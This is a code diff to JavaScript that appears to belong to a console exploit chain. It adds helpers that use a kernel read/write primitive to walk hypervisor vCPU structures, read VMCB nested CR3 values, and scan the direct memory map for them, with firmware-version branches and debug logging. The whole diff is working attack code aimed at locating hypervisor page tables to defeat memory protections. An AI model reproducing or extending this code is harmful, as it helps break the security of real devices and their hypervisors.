@@ -24,6 +24,13 @@ function i64add(a, b) {
     return new int64(lo, hi);
 }
 
+function i64sub(a, b) {
+    var al = a.low >>> 0, bl = b.low >>> 0;
+    var lo = (al - bl) >>> 0;
+    var hi = ((a.hi >>> 0) - (b.hi >>> 0) - ((al < bl) ? 1 : 0)) >>> 0;
+    return new int64(lo, hi);
+}
+
 function i64shl16(v) {
     return new int64((v << 16) >>> 0, (v >>> 16) >>> 0);
 }
@@ -88,15 +95,32 @@ async function tmrDefeat(krw, dmap, log) {
     }
 }
 
+function isKernelVA(v) {
+    return ((v.hi >>> 16) & 0xFFFF) === 0xFFFF && (v.low & 0xFFF) === 0;
+}
+
+async function readNcr3FromVmcb(krw, dmap, vmcbVA) {
+    var ncr3 = await krw.read8(vmcbVA.add32(VMCB_NCR3));
+    if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0) return ncr3;
+
+    var vmcbPA = i64sub(vmcbVA, dmap);
+    ncr3 = await krw.read8(dmapVA(dmap, vmcbPA).add32(VMCB_NCR3));
+    if ((ncr3.low !== 0 || ncr3.hi !== 0) && (ncr3.low & 0xFFF) === 0) return ncr3;
+
+    return null;
+}
+
 async function discoverNpt(krw, dmap, log) {
     var fw = window.fw_float;
 
     var tmr16Base = await tmrReadReg(krw, dmap, 16 * 16);
+    var tmr16Size = await tmrReadReg(krw, dmap, 16 * 16 + 4);
     if (tmr16Base === 0) throw new Error("TMR[16].base = 0");
 
     var kernelPA = i64shl16(tmr16Base);
     var hvDataPA = i64add(kernelPA, new int64(OFFSET_KERNEL_TEXT_SIZE, 0));
 
+    log("TMR[16] range=0x" + kernelPA.toString(16) + " size=0x" + (tmr16Size << 16).toString(16), LogLevel.LOG);
     log("HV data PA=0x" + hvDataPA.toString(16), LogLevel.LOG);
 
     if (fw < 3.00) {
@@ -104,13 +128,28 @@ async function discoverNpt(krw, dmap, log) {
             var ptrPA = hvDataPA.add32(OFFSET_HV_VCPU + c * OFFSET_HV_VCPU_CPUID);
             var vmcbVA = await krw.read8(dmapVA(dmap, ptrPA));
 
-            if (((vmcbVA.hi >>> 16) & 0xFFFF) !== 0xFFFF) continue;
-            if ((vmcbVA.low & 0xFFF) !== 0) continue;
+            if (c < 2) log("vcpu[" + c + "] ptr=0x" + vmcbVA.toString(16), LogLevel.LOG);
 
-            var ncr3 = await krw.read8(vmcbVA.add32(VMCB_NCR3));
-            if ((ncr3.low === 0 && ncr3.hi === 0) || (ncr3.low & 0xFFF) !== 0) continue;
+            if (!isKernelVA(vmcbVA)) continue;
+
+            var ncr3 = await readNcr3FromVmcb(krw, dmap, vmcbVA);
+            if (c < 2) log("vcpu[" + c + "] ncr3=" + (ncr3 ? "0x" + ncr3.toString(16) : "null"), LogLevel.LOG);
+            if (!ncr3) continue;
 
             log("nCR3=0x" + ncr3.toString(16) + " (core " + c + ")", LogLevel.INFO);
+            return ncr3;
+        }
+
+        log("No valid VMCB found via vcpu walk, trying DMAP scan...", LogLevel.LOG);
+        var scanPA = hvDataPA;
+        for (var off = 0; off < 0x40000; off += 0x1000) {
+            var probe = await krw.read8(dmapVA(dmap, scanPA.add32(off)));
+            if (!isKernelVA(probe)) continue;
+
+            var ncr3 = await readNcr3FromVmcb(krw, dmap, probe);
+            if (!ncr3) continue;
+
+            log("nCR3=0x" + ncr3.toString(16) + " (scan off=0x" + off.toString(16) + ")", LogLevel.INFO);
             return ncr3;
         }
     } else {
@@ -121,11 +160,13 @@ async function discoverNpt(krw, dmap, log) {
             var vcpuPA = vcpuArrayPA.add32(c * OFFSET_HV_VCPU_STRIDE);
             var vmcbVA = await krw.read8(dmapVA(dmap, vcpuPA.add32(OFFSET_HV_VCPU_VMCB_PTR)));
 
-            if (((vmcbVA.hi >>> 16) & 0xFFFF) !== 0xFFFF) continue;
-            if ((vmcbVA.low & 0xFFF) !== 0) continue;
+            if (c < 2) log("vcpu[" + c + "] ptr=0x" + vmcbVA.toString(16), LogLevel.LOG);
 
-            var ncr3 = await krw.read8(vmcbVA.add32(VMCB_NCR3));
-            if ((ncr3.low === 0 && ncr3.hi === 0) || (ncr3.low & 0xFFF) !== 0) continue;
+            if (!isKernelVA(vmcbVA)) continue;
+
+            var ncr3 = await readNcr3FromVmcb(krw, dmap, vmcbVA);
+            if (c < 2) log("vcpu[" + c + "] ncr3=" + (ncr3 ? "0x" + ncr3.toString(16) : "null"), LogLevel.LOG);
+            if (!ncr3) continue;
 
             log("nCR3=0x" + ncr3.toString(16) + " (core " + c + ")", LogLevel.INFO);
             return ncr3;
